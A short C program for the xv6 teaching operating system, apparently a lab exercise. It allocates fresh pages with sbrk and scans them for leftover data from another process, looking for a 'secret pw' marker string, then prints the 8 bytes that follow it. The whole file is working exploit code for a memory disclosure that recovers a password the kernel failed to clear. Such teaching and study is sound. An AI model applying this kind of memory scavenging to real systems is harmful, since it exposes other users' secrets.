#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  const char* symbol = "my very very very secret pw is:   ";
  char *end = sbrk(PGSIZE*32);
  for(int i = 0; i < 32; i++){
    int count = 0;
    for(int j = 0; j < strlen(symbol); j++)
      if(end[i * PGSIZE + j] == symbol[j])
        count++;
    if(count > strlen(symbol) / 2){
      write(2, end + i * PGSIZE + 32, 8);
    }
  }
  exit(0);
}
